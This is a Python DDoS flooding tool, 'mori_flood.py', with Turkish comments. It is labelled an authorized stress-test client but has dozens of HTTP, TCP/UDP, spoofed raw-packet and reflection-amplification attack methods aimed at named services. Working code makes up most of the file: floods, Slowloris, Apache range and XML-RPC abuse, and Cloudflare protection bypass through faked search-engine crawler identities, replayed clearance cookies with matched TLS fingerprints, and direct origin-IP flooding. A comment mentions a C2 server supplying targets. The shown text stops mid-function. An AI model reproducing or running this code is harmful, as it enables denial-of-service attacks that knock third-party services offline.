#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mori_flood.py — authorized stress test client
Requires: python3 (stdlib only). Optional: pip install requests cloudscraper

Usage:
  python3 mori_flood.py <target> <method> <duration> <threads>

  target   : http://example.com:80/ veya 1.2.3.4:80 (L4 için)
  method   : aşağıdan seç
  duration : saniye
  threads  : thread sayısı

L7 Methods  : GET POST HEAD PPS NULL OVH STRESS COOKIES APACHE XMLRPC
              DYN GSB RHEX STOMP BOT SLOW AVB CFB BYPASS EVEN DOWNLOADER STATICHTTP
              CF_BYPASS RAPID_RESET TLS_SPOOF KILLER UAM_BYPASS
              WEBSOCKET_KILLER NGINX_KILLER WORDPRESS_KILLER
              OPENRESTY_KILLER LITESPEED_KILLER NODEJS_KILLER
              BRAWLSTARS_KILLER KICK_KILLER TELEGRAM_VOICE_KILLER
              AWS_KILLER CLOUDFRONT_KILLER RPS_GOD_LEVEL
L4 Methods  : UDP TCP SYN ICMP CPS CONNECTION VSE TS3 MCPE FIVEM DISCORD MEGA_UDP
              SSHLOG_FLOOD FTP_KILLER
POST tips   : argv[9]=base64(body)  argv[10]=path  (örn: /api/login)
WSS desteği : wss://host:port/path  →  TLS+WS otomatik algılanır
AMP Methods : RDP CLDAP MEM CHAR NTP DNS ARD (root + reflectors arg gerekir)

Örnekler:
  python3 mori_flood.py http://example.com/ GET 60 100
  python3 mori_flood.py 1.2.3.4:80 UDP 60 200
  python3 mori_flood.py 1.2.3.4:53 DNS 30 50 8.8.8.8,8.8.4.4
"""

import os, sys, random, socket, ssl, struct, threading, time
from contextlib import suppress
from itertools import cycle
from threading import Thread, Event
from urllib.parse import quote, urlparse


# ── opsiyonel ─────────────────────────────────────────────────────────────────
try:    from cloudscraper import create_scraper;  HAS_CS  = True
except: HAS_CS  = False
try:    from requests import Session as RS;        HAS_REQ = True
except: HAS_REQ = False
try:    import impacket.ImpactPacket as IMP;       HAS_IMP = True
except: HAS_IMP = False

# ── global ─────────────────────────────────────────────────────────────────────
_stop  = Event()
_lock  = threading.Lock()
SENT   = [0]
BYTES  = [0]
_UAM_COOKIE_STR = ""  # set by main() when method=UAM_BYPASS

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/74.0.3729.169 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
GBOT = [u for u in UA if "ooglebot" in u or "AdsBot" in u]
REF  = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
    "https://www.facebook.com/sharer/sharer.php?u=",
    "https://drive.google.com/viewerng/viewer?url=",
    "https://www.google.com/translate?u=",
    "https://duckduckgo.com/?q=",
    "https://t.co/",
]

def rstr(n=8):   return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=n))
def rip():       return '.'.join(str(random.randint(1,254)) for _ in range(4))
def rua():       return random.choice(UA)
def rref(h):     return random.choice(REF) + quote(h)
def rint(a,b):   return random.randint(a,b)

# ── kaynak izleme ──────────────────────────────────────────────────────────────
def cpu():
    try:
        import psutil; return psutil.cpu_percent(interval=0.3)
    except: pass
    if os.path.exists('/proc/stat'):
        def _r():
            with open('/proc/stat') as f: p=f.readline().split()
            return sum(int(x) for x in p[1:]), int(p[4])
        t1,i1=_r(); time.sleep(0.3); t2,i2=_r()
        d=t2-t1; return 100*(1-(i2-i1)/d) if d else 0
    return 0

def ram():
    try:
        import psutil; return psutil.virtual_memory().percent
    except: pass
    if os.path.exists('/proc/meminfo'):
        d={}
        with open('/proc/meminfo') as f:
            for l in f:
                k,v=l.split(':'); d[k.strip()]=int(v.strip().split()[0])
        t=d.get('MemTotal',1); return 100*(1-d.get('MemAvailable',t)/t)
    return 0

def guard(mx_cpu=80, mx_ram=75):
    """Sadece uyarı verir, durdurmaz. Süre zorunludur."""
    while not _stop.is_set():
        time.sleep(5)
        c,r=cpu(),ram()
        if c>mx_cpu or r>mx_ram:
            print(f"\033[93m[WARN] CPU={c:.0f}% RAM={r:.0f}% — yüksek kaynak kullanımı\033[0m", flush=True)

# ── soket yardımcıları ─────────────────────────────────────────────────────────
def mksock(host, port, tls=False, to=4):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET,  socket.SO_REUSEADDR, 1)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY,  1)
    s.settimeout(to); s.connect((host, port))
    if tls:
        ctx=ssl.create_default_context()
        ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        s=ctx.wrap_socket(s, server_hostname=host)
    return s

def send(s, d):
    try:
        b=d if isinstance(d,bytes) else d.encode()
        s.sendall(b)
        with _lock: SENT[0]+=1; BYTES[0]+=len(b)
        return True
    except: return False

def sndto(s, d, a):
    try:
        s.sendto(d, a)
        with _lock: SENT[0]+=1; BYTES[0]+=len(d)
        return True
    except: return False

def close(s):
    with suppress(Exception):
        if s: s.close()

# ── raw paket oluşturucular ────────────────────────────────────────────────────
def mk_syn(sip, dip, dport):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        t=IMP.TCP(); t.set_SYN(); t.set_th_flags(0x02)
        t.set_th_dport(dport); t.set_th_sport(rint(32768,65535))
        ip.contains(t); return ip.get_packet()
    s=socket.inet_aton(sip); d=socket.inet_aton(dip); sp=rint(1024,65535)
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,40,rint(0,65535),0,64,socket.IPPROTO_TCP,0,s,d)
    th=struct.pack('!HHIIBHHH',sp,dport,0,0,0x50,0x02,64240,0,0)
    return ih+th

def mk_icmp(sip, dip):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        ic=IMP.ICMP(); ic.set_icmp_type(ic.ICMP_ECHO)
        ic.contains(IMP.Data(b'A'*rint(16,512))); ip.contains(ic); return ip.get_packet()
    pl=os.urandom(rint(16,512))
    h=struct.pack('bbHHh',8,0,0,rint(0,65535),1); dt=h+pl
    cs=0
    for i in range(0,len(dt),2):
        w=dt[i:i+2]
        if len(w)==2: cs+=struct.unpack('H',w)[0]
    cs=~((cs>>16)+(cs&0xffff))&0xffff
    return struct.pack('bbHHh',8,0,cs,rint(0,65535),1)+pl

def mk_amp(sip, dip, dport, payload):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        u=IMP.UDP(); u.set_uh_sport(rint(1024,65535)); u.set_uh_dport(dport)
        u.contains(IMP.Data(payload)); ip.contains(u); return ip.get_packet()
    s=socket.inet_aton(sip); d=socket.inet_aton(dip)
    ud=struct.pack('!HHHH',rint(1024,65535),dport,8+len(payload),0)+payload
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,20+len(ud),rint(0,65535),0,64,socket.IPPROTO_UDP,0,s,d)
    return ih+ud

def mk_discord(sip, dip, dport):
    if HAS_IMP:
        ip=IMP.IP(); ip.set_ip_src(sip); ip.set_ip_dst(dip)
        u=IMP.UDP(); u.set_uh_sport(rint(32768,65535)); u.set_uh_dport(dport)
        pl=b'\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00\x13\x37\xca\xfe\x01\x00\x00\x00'
        pl+=bytes([rint(0,255) for _ in range(4)])
        u.contains(IMP.Data(pl)); ip.contains(u); return ip.get_packet()
    # impacket yoksa raw UDP (root gerekir)
    sip_b=socket.inet_aton(sip); dip_b=socket.inet_aton(dip)
    pl=b'\x13\x37\xca\xfe\x01\x00\x00\x00'*3+bytes([rint(0,255) for _ in range(4)])
    sp=rint(32768,65535)
    ud=struct.pack('!HHHH',sp,dport,8+len(pl),0)+pl
    ih=struct.pack('!BBHHHBBH4s4s',0x45,0,20+len(ud),rint(0,65535),0,64,socket.IPPROTO_UDP,0,sip_b,dip_b)
    return ih+ud

# ── HTTP yük üretici ───────────────────────────────────────────────────────────
class Target:
    def __init__(self, url):
        u=urlparse(url if '://' in url else 'http://'+url)
        self.scheme=u.scheme or 'http'
        self.host=u.hostname or url
        self.tls=self.scheme in ('https', 'wss')
        self.port=u.port or (443 if self.scheme in ('https','wss') else 80)
        self.path=(u.path or '/')+('?'+u.query if u.query else '')
        self.auth=f'{self.host}:{self.port}'
        # ws/wss → HTTP Origin header 'http'/'https' kullanır
        self.origin_scheme='https' if self.scheme in ('wss','https') else 'http'
        try:    self.ip=socket.gethostbyname(self.host)
        except: self.ip=self.host

    def spoof(self):
        sp=rip()
        return (f"X-Forwarded-Proto: Http\r\nX-Forwarded-Host: {self.host}, 1.1.1.1\r\n"
                f"Via: {sp}\r\nClient-IP: {sp}\r\nX-Forwarded-For: {sp}\r\nReal-IP: {sp}\r\n")

    def rh(self):
        return f"User-Agent: {rua()}\r\nReferrer: {rref(self.host)}\r\n"+self.spoof()

    def base(self, m='GET', p=None, v=None):
        pth=p or self.path; ver=v or random.choice(['1.0','1.1','1.2'])
        return (f"{m} {pth} HTTP/{ver}\r\nHost: {self.auth}\r\n"
                "Accept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\nConnection: keep-alive\r\n"
                "Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\n"
                "Sec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n")

    def GET(self, p=None): return (self.base('GET',p)+self.rh()+"\r\n").encode()
    def HEAD(self, p=None): return (self.base('HEAD',p)+self.rh()+"\r\n").encode()
    def PPS(self): return f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
    def UAM(self, cookie_str):
        # Browser-grade headers — CF UAM için sıra ve alan adı önemli
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        return (f"GET {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Connection: keep-alive\r\n"
                f"Cache-Control: max-age=0\r\n"
                f"sec-ch-ua: \"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"\r\n"
                f"sec-ch-ua-mobile: ?0\r\n"
                f"sec-ch-ua-platform: \"Windows\"\r\n"
                f"Upgrade-Insecure-Requests: 1\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
                f"Sec-Fetch-Site: none\r\n"
                f"Sec-Fetch-Mode: navigate\r\n"
                f"Sec-Fetch-User: ?1\r\n"
                f"Sec-Fetch-Dest: document\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                f"Cookie: {cookie_str}\r\n\r\n").encode()
    def POST(self, body=None, ct='application/json'):
        b=body or f'{{"data":"{rstr(32)}"}}'
        return (self.base('POST')+self.rh()+
                f"Content-Type: {ct}\r\nContent-Length: {len(b)}\r\n"
                f"X-Requested-With: XMLHttpRequest\r\n\r\n{b}").encode()
    def conn(self, to=4): return mksock(self.ip,   self.port, self.tls, to)

# ══════════════════════════════════════════════════════════════════════════════
# L7 METOTLARI
# ══════════════════════════════════════════════════════════════════════════════
# Her worker kendi içinde loop yapar — bağlantı kopunca anında yeniden bağlanır,
# launcher spawn boşluğu olmaz → sabit yüksek RPS
def w_GET(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

_POST_BODY = None   # main() tarafından ayarlanır; None ise random body
_POST_PATH = None   # main() tarafından ayarlanır; None ise t.path

def w_POST(t, rpc):
    static_body = _POST_BODY
    path        = _POST_PATH or t.path
    while not _stop.is_set():
        with suppress(Exception):
            s = t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                b   = static_body if static_body is not None else f'{{"data":"{rstr(32)}","ts":{int(time.time())}}}'
                req = (t.base('POST', p=path) + t.rh() +
                       f"Content-Type: application/json\r\nContent-Length: {len(b)}\r\n"
                       f"X-Requested-With: XMLHttpRequest\r\n\r\n{b}").encode()
                if not send(s, req): break
            close(s)

def w_HEAD(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.HEAD()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_PPS(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.PPS()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_NULL(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            pl=(t.base('GET')+t.spoof()+"User-Agent: null\r\nReferrer: null\r\n\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_OVH(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(min(rpc,5)):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_STRESS(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                if not send(s, t.POST(f'{{"data":"{rstr(512)}"}}')): break
            close(s)

def w_COOKIES(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            ck=f"_ga=GA{rint(1000,99999)};_gat=1;__cfduid=dc{rstr(32)};{rstr(6)}={rstr(32)}\r\n"
            pl=(t.base('GET')+t.rh()+f"Cookie: {ck}\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_APACHE(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            rng="bytes=0-,"+",".join(f"5-{i}" for i in range(1,1024))
            pl=(t.base('GET')+t.rh()+f"Range: {rng}\r\n\r\n").encode()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_XMLRPC(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            body=(f"<?xml version='1.0' encoding='iso-8859-1'?><methodCall>"
                  f"<methodName>pingback.ping</methodName><params>"
                  f"<param><value><string>{rstr(64)}</string></value></param>"
                  f"<param><value><string>{rstr(64)}</string></value></param>"
                  f"</params></methodCall>")
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set() or not send(s, t.POST(body,'application/xml')): break
            close(s)

def w_DYN(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                pl=(t.base('GET')+t.spoof()+
                    f"User-Agent: {rua()}\r\nHost: {rstr(6)}.{t.host}:{t.port}\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_GSB(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                pl=(t.base('HEAD',f"{t.path}?qs={rstr(6)}&{rstr(4)}={rstr(8)}")+
                    t.rh()+"Connection: Keep-Alive\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_RHEX(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn()
            for _ in range(rpc):
                if _stop.is_set(): break
                hx=os.urandom(random.choice([32,64,128])).hex()
                pl=(f"GET {t.path}/{hx} HTTP/1.1\r\nHost: {t.auth}/{hx}\r\n"
                    +t.rh()+"Accept-Encoding: gzip,deflate,br\r\nConnection: keep-alive\r\n\r\n").encode()
                if not send(s,pl): break
            close(s)

def w_STOMP(t, rpc):
    hx=(r'\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA')*22+' '
    dep="Accept-Encoding: gzip,deflate,br\r\nConnection: keep-alive\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
    while not _stop.is_set():
        with suppress(Exception):
            p1=(f"GET {t.path}/{hx} HTTP/1.1\r\nHost: {t.auth}/{hx}\r\n"+t.rh()+dep).encode()
            p2=(f"GET {t.path}/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: {hx}\r\n"+t.rh()+dep).encode()
            s=t.conn(); send(s,p1)
            for _ in range(rpc):
                if _stop.is_set() or not send(s,p2): break
            close(s)

def w_BOT(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            ua=random.choice(GBOT) if GBOT else rua()
            p1=(f"GET /robots.txt HTTP/1.1\r\nHost: {t.auth}\r\n"
                f"Connection: Keep-Alive\r\nAccept: text/plain,*/*\r\n"
                f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n").encode()
            p2=(f"GET /sitemap.xml HTTP/1.1\r\nHost: {t.auth}\r\n"
                f"Connection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\n"
                f"User-Agent: {ua}\r\nAccept-Encoding: gzip,deflate,br\r\n"
                f"If-None-Match: {rstr(9)}-{rstr(4)}\r\n"
                f"If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n").encode()
            s=t.conn(); send(s,p1); send(s,p2)
            pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set() or not send(s,pl): break
            close(s)

def w_SLOW(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(60); send(s, t.GET())
            for _ in range(rpc):
                if _stop.is_set(): break
                time.sleep(random.uniform(0.5,2.0))
                if not send(s, f"X-a: {rint(1,9999)}\r\n".encode()): break
            close(s)

def w_AVB(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set(): break
                time.sleep(max(rpc/1000,1))
                if not send(s,pl): break
            close(s)

def w_CFB(t, rpc):
    url=f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        if HAS_CS:
            with suppress(Exception), create_scraper() as s:
                for _ in range(rpc):
                    if _stop.is_set(): break
                    with suppress(Exception): s.get(url); SENT[0]+=1
        else:
            import urllib.request
            ctx2=ssl.create_default_context(); ctx2.check_hostname=False; ctx2.verify_mode=ssl.CERT_NONE
            req=urllib.request.Request(url, headers={"User-Agent": rua()})
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception): urllib.request.urlopen(req,timeout=5,context=ctx2); SENT[0]+=1

def w_BYPASS(t, rpc):
    url=f"{t.scheme}://{t.auth}{t.path}"
    while not _stop.is_set():
        if HAS_REQ:
            with suppress(Exception), RS() as s:
                for _ in range(rpc):
                    if _stop.is_set(): break
                    with suppress(Exception): s.get(url,headers={"User-Agent":rua()},timeout=5,verify=False); SENT[0]+=1
        else:
            w_CFB(t, rpc); break

def w_EVEN(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(10); pl=t.GET()
            while not _stop.is_set():
                if not send(s,pl): break
                try: s.recv(512)
                except: break
            close(s)

def w_DOWNLOADER(t, rpc):
    while not _stop.is_set():
        with suppress(Exception):
            s=t.conn(30); pl=t.GET()
            for _ in range(rpc):
                if _stop.is_set(): break
                send(s,pl)
                while not _stop.is_set():
                    time.sleep(0.01)
                    if not s.recv(1): break
            close(s)

def _fill_jar(jar, host, cookie_str):
    """Cookie string'i (k=v; k2=v2) CookieJar'a doldur — cf_clearance dahil."""
    import http.cookiejar as hcj
    for pair in (cookie_str or '').split(';'):
        pair = pair.strip()
        if '=' not in pair:
            continue
        name, value = pair.split('=', 1)
        jar.set_cookie(hcj.Cookie(
            version=0, name=name.strip(), value=value.strip(),
            port=None, port_specified=False,
            domain=host, domain_specified=True, domain_initial_dot=False,
            path='/', path_specified=True, secure=False, expires=None,
            discard=True, comment=None, comment_url=None, rest={},
        ))

def _detect_browser(cookie_str='', ua_str=''):
    """UA veya cookie string'den tarayıcı profilini tahmin et (chrome/firefox).
    JA3 eşleşmesi için cf_clearance'ı alan cihazın profilini seçmek kritik."""
    haystack = (cookie_str + ' ' + ua_str).lower()
    if 'firefox' in haystack or '; rv:' in haystack:
        return 'firefox'
    return 'chrome'

def _flood_origin(t, rpc, origin_ips, ck, ck_dict, browser='chrome'):
    """
    Origin IP listesine round-robin flood — Host header = asıl domain.
    JA3 tekniği: _mk_ssl(browser) ile browser TLS el sıkışması + SNI = domain.
    CF proxy devre dışı; sadece origin sunucuya ulaşılır.
    """
    from itertools import cycle as _cycle
    ip_cyc = _cycle(origin_ips)
    ctx    = _mk_ssl(browser)
    while not _stop.is_set():
        with suppress(Exception):
            ip  = next(ip_cyc)
            pkt = t.UAM(ck)
            if t.tls:
                raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                raw.settimeout(4)
                raw.connect((ip, t.port))
                # server_hostname = domain (SNI), IP'ye bağlanıyoruz
                s = ctx.wrap_socket(raw, server_hostname=t.host)
            else:
                orig = Target(f"{t.scheme}://{ip}{t.path}")
                s    = orig.conn()
            for _ in range(rpc):
                if _stop.is_set() or not send(s, pkt): break
            close(s)


def _flood_cf(t, rpc, url, ck, ck_dict, browser='chrome'):
    """
    CF üzerinden JA3-matching flood (stdlib only, harici bağımlılık yok).

    Teknik (kullanıcının kişisinden alınan yöntem):
      cf_clearance cookie'yi aldığı cihazın TLS parmak izi (JA3) + header seti
      birebir simüle edilir. CF parmak izi %100 uyuşunca aynı kullanıcı ama
      IP değişmiş muamelesi görür → mobil IP rotasyonu toleransı devreye girer.

    _mk_opener(browser, jar):
      • SSLContext → browser cipher suite sırası (JA3'ün asıl belirleyicisi)
      • set_ecdh_curve('prime256v1') → ECDH grubu eşleşmesi
      • addheaders → browser header sırası (stealth.py'den alınan _BP['order'])
    """
    import http.cookiejar as hcj
    while not _stop.is_set():
        with suppress(Exception):
            jar = hcj.CookieJar()
            _fill_jar(jar, t.host, ck)      # cf_clearance + diğer cookie'ler
            opener = _mk_opener(browser, jar)
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception):
                    r = opener.open(url, timeout=8)
                    d = r.read()
                    with _lock: SENT[0] += 1; BYTES[0] += len(d)


_UAM_ORIGIN_IPS = []   # C2 sunucusu tarafından doldurulur (argv[10])

# ── CF_UAM_BOT_BYPASS — Bot crawler simülasyonu ile CF IUAM bypass ──────────────
# CF Bot Management'ın "Verified Bot" whitelist'i: Bingbot, DuckDuckBot, YandexBot
# gibi botlar CF'nin IUAM challenge'ını almaz (robots.txt content signal + rDNS).
# Teknik: gerçek bot UA + crawler davranış sırası (robots.txt → sitemap → hedef)
#         + bot'a özgü header seti → CF bot analiz katmanını kandır.
# NOT: cf_clearance cookie'si GEREKMEZ — bot kimliği challenge'ı atlatır.
# Bingbot/YandexBot: rDNS doğrulaması Googlebot kadar sıkı değil → klonlanabilir.

_BOT_PROFILES = [
    {
        'name': 'Bingbot',
        'ua': 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'from': 'bingbot@microsoft.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'en-US,en;q=0.5',
    },
    {
        'name': 'DuckDuckBot',
        'ua': 'DuckDuckBot/1.1; (+http://duckduckgo.com/duckduckbot.html)',
        'from': 'duckduckbot@duckduckgo.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'en-US,en;q=0.5',
    },
    {
        'name': 'YandexBot',
        'ua': 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
        'from': 'robot@yandex.ru',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'ru,en;q=0.7',
    },
    {
        'name': 'Baiduspider',
        'ua': 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'from': 'spider@baidu.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'zh-CN,zh;q=0.9,en;q=0.3',
    },
    {
        'name': 'AhrefsBot',
        'ua': 'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
        'from': 'support@ahrefs.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'en-US,en;q=0.5',
    },
    {
        'name': 'SemrushBot',
        'ua': 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
        'from': '',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'en-US,en;q=0.5',
    },
    {
        'name': 'facebookexternalhit',
        'ua': 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
        'from': '',
        'accept': 'text/html',
        'accept_lang': 'en',
    },
    {
        'name': 'Twitterbot',
        'ua': 'Twitterbot/1.0',
        'from': '',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept_lang': 'en-US,en;q=0.5',
    },
]


def _mk_bot_opener(prof, jar):
    """Bot UA + crawler header seti ile opener oluştur (TLS fingerprint önemsiz)."""
    import urllib.request as _ureq, ssl as _ssl
    ctx = _ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = _ssl.CERT_NONE
    handler = _ureq.HTTPSHandler(context=ctx)
    ck_handler = _ureq.HTTPCookieProcessor(jar)
    opener = _ureq.build_opener(handler, ck_handler)
    headers = [
        ('User-Agent',      prof['ua']),
        ('Accept',          prof['accept']),
        ('Accept-Language', prof['accept_lang']),
        ('Accept-Encoding', 'gzip, deflate, br'),
        ('Connection',      'keep-alive'),
    ]
    if prof.get('from'):
        headers.append(('From', prof['from']))
    opener.addheaders = headers
    return opener


def _flood_bot(t, rpc, url):
    """
    Bot crawler davranış simülasyonu:
      1. /robots.txt → CF bot analiz katmanına "gerçek crawler" sinyali gönder
      2. %60 ihtimalle /sitemap.xml → gezinti derinliği simülasyonu
      3. Ana hedef flood → IUAM challenge almadan L7 yük
    Her thread farklı bot profili kullanır (profil rotasyonu).
    """
    import http.cookiejar as hcj, random as _rnd, time as _tm
    base_url = f"{t.scheme}://{t.host}"
    while not _stop.is_set():
        with suppress(Exception):
            prof = _rnd.choice(_BOT_PROFILES)
            jar  = hcj.CookieJar()
            opener = _mk_bot_opener(prof, jar)

            # Warm-up: robots.txt (CF'ye bot kimliğini kanıtla)
            with suppress(Exception):
                opener.open(f"{base_url}/robots.txt", timeout=6).read()
            _tm.sleep(_rnd.uniform(0.3, 0.9))

            # %60 ihtimalle sitemap.xml (crawler davranış derinliği)
            if _rnd.random() < 0.6:
                with suppress(Exception):
                    opener.open(f"{base_url}/sitemap.xml", timeout=6).read()
                _tm.sleep(_rnd.uniform(0.1, 0.5))

            # Ana hedef flood
            for _ in range(rpc):
                if _stop.is_set(): break
                with suppress(Exception):
                    r = opener.open(url, timeout=8)
                    d = r.read()
                    with _lock: SENT[0] += 1; BYTES[0] += len(d)


def w_CF_UAM_BOT_BYPASS(t, rpc):
    """
    CF IUAM bypass — Verified Bot kimliği simülasyonu.
    Cookie veya origin IP gerektirmez.
    CF Bot Management whitelist'indeki crawler UA'ları + davranış kalıbı:
      robots.txt fetch → sitemap fetch → asıl hedef flood
    Profil rotasyonu: her thread farklı bot (Bingbot/Yandex/DuckDuck/Baidu/Ahrefs...)
    """
    url = f"{t.scheme}://{t.auth}{t.path}"
    bot_names = ', '.join(p['name'] for p in _BOT_PROFILES)
    print(f"\033[96m[BOT_BYPASS] {len(_BOT_PROFILES)} bot profili rotasyonu: {bot_names}\033[0m", flush=True)
    print(f"\033[96m[BOT_BYPASS] robots.txt → sitemap warm-up → {url}\033[0m", flush=True)
    _flood_bot(t, rpc, url)

def w_UAM_BYPASS(t, rpc):
    """
    CF UAM bypass — JA3/header fingerprint eşleşme tekniği.
      • _UAM_ORIGIN_IPS doluysa → direkt origin flood (CF tamamen atlatıldı)
                                   browser TLS cipher suite ile SNI bağlantı
      • cookie varsa            → JA3-matching CF flood (IP mismatch tolerance)
                                   cookie'yi alan cihazın cipher suite + header order
    """
    ck  = _UAM_COOKIE_STR
    url = f"{t.scheme}://{t.auth}{t.path}"

    ck_dict = {}
    for pair in ck.split(';'):
        pair = pair.strip()
        if '=' in pair:
            k, v = pair.split('=', 1)
            ck_dict[k.strip()] = v.strip()

    # cf_clearance'ı alan cihazın tarayıcı profilini tespit et
    browser = _detect_browser(ck)

    if _UAM_ORIGIN_IPS:
